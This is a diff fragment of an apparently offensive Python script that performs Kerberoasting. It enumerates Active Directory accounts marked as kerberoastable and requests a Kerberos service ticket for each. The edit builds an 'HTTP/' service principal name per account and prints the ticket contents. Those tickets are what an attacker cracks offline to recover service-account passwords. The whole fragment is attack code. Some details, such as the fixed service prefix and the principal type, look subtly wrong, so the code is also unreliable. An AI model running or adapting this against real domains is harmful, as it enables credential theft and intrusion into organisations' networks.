@@ -18,9 +18,11 @@ def kerberoast(username, password, domain, dc_ip):
             if kerberoastable_accounts:
                 print("Kerberoastable Accounts:")
                 for account in kerberoastable_accounts:
-                    print(account)
+                    # Construct the SPN
+                    spn = f"HTTP/{account}@{domain}"
+                    print(spn)
                     # Kerberoast each account
-                    principal = Principal(account, type=Principal.NT_PRINCIPAL)
+                    principal = Principal(spn, type=Principal.NT_PRINCIPAL)
                     tgs_rep = getKerberosTGS(krbtgt_ticket, principal)
                     print(f"TGS_REP for {account}:")
                     print(tgs_rep.native)
